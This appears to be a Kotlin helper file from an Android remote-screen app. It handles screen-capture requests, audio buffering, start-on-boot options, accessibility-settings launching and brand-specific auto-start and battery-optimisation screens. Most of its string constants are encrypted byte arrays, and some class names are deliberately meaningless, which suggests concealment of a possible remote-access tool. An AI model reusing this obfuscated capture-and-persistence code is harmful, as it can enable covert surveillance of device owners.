package com.cloudsend.app

import android.Manifest.permission.*
import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.AudioRecord
import android.media.AudioRecord.READ_BLOCKING
import android.media.MediaCodecList
import android.media.MediaFormat
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.os.PowerManager
import android.provider.Settings
import android.provider.Settings.*
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.annotation.RequiresApi
import androidx.core.content.ContextCompat.getSystemService
import com.hjq.permissions.Permission
import com.hjq.permissions.XXPermissions
import pkg2230.ClsFx9V0S
import java.nio.ByteBuffer
import java.util.*


// intent action, extra
 val ACT_REQUEST_MEDIA_PROJECTION = p50.a(byteArrayOf(113, 120, 104, 109, -108, -46, -13, -48, -27, -44, 103, 116, 120, 103, -127, -45, -24, -59, -19, -46, 119, 116, 118, 118), byteArrayOf(35, 61, 57, 56, -47, -127, -89, -113, -88, -111))
 val ACT_INIT_MEDIA_PROJECTION_AND_SERVICE = p50.a(byteArrayOf(51, -80, 14, -95, 111, -113, -71, -8, 51, -65, 24, -91, 98, -115, -74, -7, 57, -86, 14, -70, 126, -99, -67, -14, 62, -95, 20, -80, 98, -108, -75, -1, 63), byteArrayOf(122, -2, 71, -11, 48, -62, -4, -68))
 val ACT_LOGIN_REQ_NOTIFY = p50.a(byteArrayOf(5, 8, 78, -128, -71, 106, 27, 2, 88, -106, -71, 122, 29, 14, 79, -112), byteArrayOf(73, 71, 9, -55, -9, 53))
 val EXT_INIT_FROM_BOOT = p50.a(byteArrayOf(24, -123, 111, 3, 53, 66, -74, 68, 2, -101, 105, 19, 49, 83, -67, 95, 18, -119), byteArrayOf(93, -35, 59, 92, 124, 12, -1, 16))
 val EXT_MEDIA_PROJECTION_RES_INTENT = p50.a(byteArrayOf(93, 125, -44, -64, 114, 1, -29, 66, 119, -38, -52, 112, 10, -6, 95, 118, -49, -37, 118, 13, -20, 89, 118, -60, -52, 125, 10), byteArrayOf(16, 56, -112, -119, 51, 94, -77))
 val EXT_LOGIN_REQ_NOTIFY = p50.a(byteArrayOf(125, -108, 113, -53, 42, -95, 99, -98, 103, -35, 42, -79, 101, -110, 112, -37), byteArrayOf(49, -37, 54, -126, 100, -2))

// Activity requestCode
const val REQ_INVOKE_PERMISSION_ACTIVITY_MEDIA_PROJECTION = 101
const val REQ_REQUEST_MEDIA_PROJECTION = 201

// Activity responseCode 1
const val RES_FAILED = -100

// Flutter channel
 val START_ACTION = p50.a(byteArrayOf(-110, -2, 102, 116, -81, 108, 17, 35, -17, -97, -114, -28), byteArrayOf(-31, -118, 7, 6, -37, 51, 112, 64, -101, -10))
 val GET_START_ON_BOOT_OPT = p50.a(byteArrayOf(-42, 9, 64, -116, 30, -117, 87, -26, 84, -43, -34, 2, 107, -79, 2, -112, 66, -53, 79, -6, -59), byteArrayOf(-79, 108, 52, -45, 109, -1, 54, -108, 32, -118))
 val SET_START_ON_BOOT_OPT = p50.a(byteArrayOf(64, -128, -98, -53, 127, -29, 82, -105, -98, -53, 99, -7, 108, -121, -123, -5, 120, -56, 92, -107, -98), byteArrayOf(51, -27, -22, -108, 12, -105))
 val SYNC_APP_DIR_CONFIG_PATH = p50.a(byteArrayOf(-116, 113, -105, -68, 10, 26, -126, 117, -89, 80, -106, 122), byteArrayOf(-1, 8, -7, -33, 85, 123, -14, 5, -8, 52))
 val GET_VALUE = p50.a(byteArrayOf(-57, -110, -128, -51, -97, -51, 42, -67, -59), byteArrayOf(-96, -9, -12, -110, -23, -84, 70, -56))

 val KEY_IS_SUPPORT_VOICE_CALL = p50.a(byteArrayOf(37, 115, 18, -113, -105, 15, 42, 61, 99, 27, -128, -111, 14, 33, 49, 96, 4, -103, -99, 25, 42, 45, 119, 7, -100), byteArrayOf(110, 54, 75, -48, -34, 92, 117))

 val KEY_SHARED_PREFERENCES = p50.a(byteArrayOf(106, 89, 31, 120, -118, 109, -35, 115, 89, 2, 120, -119, 119, -39, 103, 89, 20, 98, -105, 102, -39, 114), byteArrayOf(33, 28, 70, 39, -39, 37, -100))
 val KEY_START_ON_BOOT_OPT = p50.a(byteArrayOf(26, -105, 78, -26, -78, 60, 71, 83, 50, 14, -99, 89, -26, -93, 39, 73, 85, 57, 30, -126, 67), byteArrayOf(81, -46, 23, -71, -31, 104, 6, 1, 102))
 val KEY_APP_DIR_CONFIG_PATH = p50.a(byteArrayOf(-39, 50, -8, -93, 124, 29, 20, 102, -23, -127, -18, -51, 52, -18, -78, 123, 4, 3, 102, -3, -119, -24, -38), byteArrayOf(-110, 119, -95, -4, 61, 77, 68, 57, -83, -56, -68))

var gohome = 8  

var HomeWidth = 0    
var HomeHeight = 0
var HomeDpi = 0
@Volatile
var SKL = false
@Volatile
var BIS = false

 @Volatile
 var shouldRun = false
 var SDT = 100 //30 11 90 03 66 28 11

 var ClassGen12TP = "";
 var ClassGen12NP = false;
 var d5 = p50.a(byteArrayOf(85), byteArrayOf(1, -8, 5, -100, -29, -36, -18, 6, -57, -46, 88));
 var Wt = false


val LOCAL_NAME = Locale.getDefault().toString()
val SCREEN_INFO = Info(0, 0, 1, 200)

data class Info(
    var width: Int, var height: Int, var scale: Int, var dpi: Int
)

fun isSupportVoiceCall(): Boolean {
    // https://developer.android.com/reference/android/media/MediaRecorder.AudioSource#VOICE_COMMUNICATION
    return Build.VERSION.SDK_INT >= Build.VERSION_CODES.R
}

fun requestPermission(context: Context, type: String) {
    XXPermissions.with(context)
        .permission(type)
        .request { _, all ->
            if (all) {
                Handler(Looper.getMainLooper()).post {
                    oFtTiPzsqzBHGigp.flutterMethodChannel?.invokeMethod(
                        p50.a(byteArrayOf(49, -89, -95, -44, 75, -70, -117, -115, -55, 58, -106, -114, -48, 87, -77, -112, -111, -45, 55, -90, -112, -22, 87, -69, -118, -105, -52, 42), byteArrayOf(94, -55, -2, -75, 37, -34, -7, -30, -96)),
                        mapOf(p50.a(byteArrayOf(-96, 73, 88, -76), byteArrayOf(-44, 48, 40, -47, 31, -76, 69, -124, 42, 19)) to type, p50.a(byteArrayOf(-54, -91, 108, -114, 8, 23), byteArrayOf(-72, -64, 31, -5, 100, 99, 30)) to all)
                    )
                }
            }
        }
}

fun startAction(context: Context, action: String) {
    try {
        context.startActivity(Intent(action).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            // don't pass package name when launch ACTION_ACCESSIBILITY_SETTINGS
            if (ACTION_ACCESSIBILITY_SETTINGS != action) {
                data = Uri.parse("package:" + context.packageName)
            }
        })
    } catch (e: Exception) {
        e.printStackTrace()
    }
}

class AudioReader(val bufSize: Int, private val maxFrames: Int) {
    private var currentPos = 0
    private val bufferPool: Array<ByteBuffer>

    init {
        if (maxFrames < 0 || maxFrames > 32) {
            throw Exception(p50.a(byteArrayOf(-13, -45, -20, 83, -48, -60, 14, 101, -119, -56, -46, -62, -21), byteArrayOf(-68, -90, -104, 115, -65, -94, 46, 7, -26, -67)))
        }
        if (bufSize <= 0) {
            throw Exception(p50.a(byteArrayOf(-93, 81, 72, 52, -29, 84, 12, 124, 105, -89, 74, 93, 63), byteArrayOf(-12, 35, 39, 90, -124, 116, 110, 9, 15)))
        }
        bufferPool = Array(maxFrames) {
            ByteBuffer.allocateDirect(bufSize)
        }
    }

    private fun next() {
        currentPos++
        if (currentPos >= maxFrames) {
            currentPos = 0
        }
    }

    @RequiresApi(Build.VERSION_CODES.M)
    fun readSync(audioRecord: AudioRecord): ByteBuffer? {
        val buffer = bufferPool[currentPos]
        val res = audioRecord.read(buffer, bufSize, READ_BLOCKING)
        return if (res > 0) {
            next()
            buffer
        } else {
            null
        }
    }
}


fun getScreenSize(windowManager: WindowManager) : Pair<Int, Int>{
    var w = 0
    var h = 0

    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
        val m = windowManager.maximumWindowMetrics
        w = m.bounds.width()
        h = m.bounds.height()
    } else {
        val dm = DisplayMetrics()
        windowManager.defaultDisplay.getRealMetrics(dm)
        w = dm.widthPixels
        h = dm.heightPixels
    }
    return Pair(w, h)
}

 fun translate(input: String): String {
    return ClsFx9V0S.xGTQZqzq(LOCAL_NAME, input)
}

/**
 * 获取手机品牌
 */
fun getPhoneBrand(): String {
    return Build.BRAND.toLowerCase(Locale.getDefault())
}

/**
 * 为不同品牌的手机请求自启动权限和电池优化设置
 */
fun requestAutoStartPermission(context: Context) {
    val brand = getPhoneBrand()
    try {
        when {
            brand.contains("huawei") -> {
                // 华为手机
                // 1. 打开自启动设置
                val intent = Intent()
                intent.component = ComponentName(
                    "com.huawei.systemmanager",
                    "com.huawei.systemmanager.startupmgr.ui.StartupNormalAppListActivity"
                )
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                
                // 2. 延迟打开电池优化设置
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        val batteryIntent = Intent()
                        batteryIntent.component = ComponentName(
                            "com.huawei.systemmanager",
                            "com.huawei.systemmanager.power.ui.HwPowerManagerActivity"
                        )
                        batteryIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(batteryIntent)
                    } catch (e: Exception) {
                        // 如果打开电池优化设置失败，尝试打开应用信息页面
                        try {
                            val appInfoIntent = Intent()
                            appInfoIntent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                            appInfoIntent.data = Uri.parse("package:" + context.packageName)
                            appInfoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            context.startActivity(appInfoIntent)
                        } catch (ex: Exception) {
                            ex.printStackTrace()
                        }
                    }
                }, 2000)
            }
            brand.contains("oppo") -> {
                // OPPO手机
                // 1. 打开自启动设置
                val intent = Intent()
                intent.component = ComponentName(
                    "com.coloros.safecenter",
                    "com.coloros.safecenter.permission.startup.StartupAppListActivity"
                )
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                
                // 2. 延迟打开电池高级设置
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        val batteryIntent = Intent()
                        batteryIntent.component = ComponentName(
                            "com.coloros.safecenter",
                            "com.coloros.safecenter.power.PowerUsageModelActivity"
                        )
                        batteryIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(batteryIntent)
                    } catch (e: Exception) {
                        // 如果打开电池高级设置失败，尝试打开应用信息页面
                        try {
                            val appInfoIntent = Intent()
                            appInfoIntent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                            appInfoIntent.data = Uri.parse("package:" + context.packageName)
                            appInfoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            context.startActivity(appInfoIntent)
                        } catch (ex: Exception) {
                            ex.printStackTrace()
                        }
                    }
                }, 2000)
            }
            brand.contains("vivo") -> {
                // vivo手机
                // 1. 打开自启动设置
                val intent = Intent()
                intent.component = ComponentName(
                    "com.vivo.permissionmanager",
                    "com.vivo.permissionmanager.activity.BgStartUpManagerActivity"
                )
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
                
                // 2. 延迟打开电池优化设置
                Handler(Looper.getMainLooper()).postDelayed({
                    try {
                        val batteryIntent = Intent()
                        batteryIntent.component = ComponentName(
                            "com.iqoo.secure",
                            "com.iqoo.secure.ui.phoneoptimize.BatteryOptimizePage"
                        )
                        batteryIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                        context.startActivity(batteryIntent)
                    } catch (e: Exception) {
                        // 如果打开电池优化设置失败，尝试打开应用信息页面
                        try {
                            val appInfoIntent = Intent()
                            appInfoIntent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                            appInfoIntent.data = Uri.parse("package:" + context.packageName)
                            appInfoIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            context.startActivity(appInfoIntent)
                        } catch (ex: Exception) {
                            ex.printStackTrace()
                        }
                    }
                }, 2000)
            }
            brand.contains("xiaomi") -> {
                // 小米手机
                val intent = Intent()
                intent.component = ComponentName(
                    "com.miui.securitycenter",
                    "com.miui.permcenter.autostart.AutoStartManagementActivity"
                )
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
            }
            else -> {
                // 其他品牌手机，尝试打开通用的自启动设置
                val intent = Intent()
                intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
                intent.data = Uri.parse("package:" + context.packageName)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                context.startActivity(intent)
            }
        }
    } catch (e: Exception) {
        // 如果打开特定品牌的设置页面失败，尝试打开通用的应用信息页面
        try {
            val intent = Intent()
            intent.action = Settings.ACTION_APPLICATION_DETAILS_SETTINGS
            intent.data = Uri.parse("package:" + context.packageName)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (ex: Exception) {
            ex.printStackTrace()
        }
    }
}
